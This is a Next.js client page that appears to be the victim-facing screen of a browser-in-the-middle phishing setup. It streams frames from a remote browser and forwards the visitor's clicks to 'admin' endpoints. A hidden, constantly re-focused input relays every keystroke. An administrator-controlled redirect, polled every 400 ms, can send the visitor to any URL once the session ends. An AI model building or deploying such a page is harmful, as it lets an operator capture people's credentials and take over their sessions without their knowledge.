"use client";

import { useEffect, useState, useRef, Suspense } from "react";
import { useSearchParams } from "next/navigation";

function ClientViewContent() {
  const searchParams = useSearchParams();
  const urlSessionId = searchParams.get("sessionId") || "";
  const [sessionId, setSessionId] = useState(urlSessionId);
  const [frame, setFrame] = useState<string | null>(null);
  const [isTerminated, setIsTerminated] = useState(false);
  const imageRef = useRef<HTMLImageElement>(null);
  const hiddenInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (urlSessionId) {
      setSessionId(urlSessionId);
    }
  }, [urlSessionId]);

  // 1. Session Termination & Redirect Polling
  useEffect(() => {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/admin/redirect`, { cache: "no-store" });
        if (res.ok) {
          const data = await res.json();
          if (data?.redirectUrl && data.redirectUrl.trim() !== "") {
            setIsTerminated(true);
            setFrame(null);
            window.location.href = data.redirectUrl;
          }
        }
      } catch (err) {}
    }, 400);
    return () => clearInterval(interval);
  }, []);

  // 2. High-Speed Responsive Frame Streaming (Optimized for Mobile Speed)
  useEffect(() => {
    if (isTerminated || !sessionId) return;
    let isMounted = true;

    const fetchFrame = async () => {
      try {
        const res = await fetch(`/api/admin/stream?sessionId=${sessionId}&quality=75`, { cache: "no-store" });
        const data = await res.json();
        if (data.success && isMounted && data.frame) {
          setFrame(data.frame);
        } else if (!data.success) {
          setFrame(null);
        }
      } catch (err) {}
    };

    fetchFrame();
    const interval = setInterval(fetchFrame, 250);

    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, [sessionId, isTerminated]);

  // 3. Keep Mobile Keyboard Active & Focused
  useEffect(() => {
    const focusTimer = setInterval(() => {
      if (hiddenInputRef.current && document.activeElement !== hiddenInputRef.current) {
        hiddenInputRef.current.focus({ preventScroll: true });
      }
    }, 300);
    return () => clearInterval(focusTimer);
  }, []);

  // 4. Responsive Touch & Click Coordinate Mapping (100% Mobile Accurate)
  const handleInteraction = async (clientX: number, clientY: number) => {
    if (isTerminated || !sessionId || !imageRef.current) return;
    
    if (hiddenInputRef.current) {
      hiddenInputRef.current.focus({ preventScroll: true });
    }

    const rect = imageRef.current.getBoundingClientRect();
    const containerWidth = rect.width;
    const containerHeight = rect.height;

    const targetAspect = 1280 / 800;
    const containerAspect = containerWidth / containerHeight;

    let renderWidth = containerWidth;
    let renderHeight = containerHeight;
    let offsetX = 0;
    let offsetY = 0;

    if (containerAspect > targetAspect) {
      renderWidth = containerHeight * targetAspect;
      offsetX = (containerWidth - renderWidth) / 2;
    } else {
      renderHeight = containerWidth / targetAspect;
      offsetY = (containerHeight - renderHeight) / 2;
    }

    const clickX = clientX - rect.left - offsetX;
    const clickY = clientY - rect.top - offsetY;

    if (clickX < 0 || clickX > renderWidth || clickY < 0 || clickY > renderHeight) return;

    const x = Math.round((clickX / renderWidth) * 1280);
    const y = Math.round((clickY / renderHeight) * 800);
    
    try {
      await fetch("/api/admin/click", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ x, y, button: "left", sessionId }),
      });
    } catch (err) {}
  };

  // 5. Seamless Mobile Typing & Backspace Handler
  const handleInputText = async (e: React.ChangeEvent<HTMLInputElement>) => {
    if (isTerminated || !sessionId) return;
    const val = e.target.value;
    if (!val) return;

    const charToSend = val;
    e.target.value = "";

    try {
      await fetch("/api/admin/type", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: charToSend, sessionId }),
      });
    } catch (err) {}
  };

  const handleKeyDown = async (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (isTerminated || !sessionId) return;
    try {
      if (e.key === "Backspace" || e.key === "Enter" || e.key === "Delete" || e.key === "Tab") {
        await fetch("/api/admin/type", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ key: e.key, sessionId }),
        });
      }
    } catch (err) {}
  };

  if (isTerminated) {
    return (
      <div className="fixed inset-0 bg-zinc-950 flex flex-col items-center justify-center text-white font-sans select-none">
        <div className="bg-zinc-900 border border-zinc-800 p-8 rounded-2xl shadow-2xl text-center space-y-3 max-w-sm w-full">
          <div className="w-12 h-12 rounded-full bg-rose-500/10 text-rose-500 border border-rose-500/20 flex items-center justify-center mx-auto text-lg font-bold">✕</div>
          <h2 className="text-sm font-bold text-zinc-100">Session Closed</h2>
          <p className="text-xs text-zinc-400">The administrator has ended this session.</p>
        </div>
      </div>
    );
  }

  return (
    <div 
      className="fixed inset-0 w-full h-[100dvh] bg-black flex items-center justify-center overflow-hidden select-none touch-none m-0 p-0"
      onClick={(e) => handleInteraction(e.clientX, e.clientY)}
      onTouchStart={(e) => {
        if (e.touches?.[0]) {
          handleInteraction(e.touches[0].clientX, e.touches[0].clientY);
        }
      }}
    >
      {/* Hidden Mobile Keyboard Input */}
      <input 
        ref={hiddenInputRef}
        type="text" 
        onChange={handleInputText}
        onKeyDown={handleKeyDown}
        className="absolute opacity-0 w-0 h-0 inset-0 pointer-events-none"
        autoComplete="off"
        autoCapitalize="off"
        autoCorrect="off"
        spellCheck="false"
        autoFocus
      />

      {frame ? (
        <div className="relative w-full h-full flex items-center justify-center">
          <img 
            ref={imageRef}
            src={frame} 
            alt="Mobile Responsive Stream" 
            className="w-full h-full object-contain max-w-full max-h-[100dvh] pointer-events-none"
          />
        </div>
      ) : (
        <div className="flex flex-col items-center gap-3 text-zinc-500">
          <div className="w-8 h-8 border-2 border-zinc-600 border-t-emerald-500 rounded-full animate-spin"></div>
          <p className="text-xs font-medium">Connecting to mobile stream...</p>
        </div>
      )}
    </div>
  );
}

export default function ClientViewPage() {
  return (
    <Suspense fallback={<div className="fixed inset-0 bg-black text-white flex items-center justify-center text-xs">Loading...</div>}>
      <ClientViewContent />
    </Suspense>
  );
}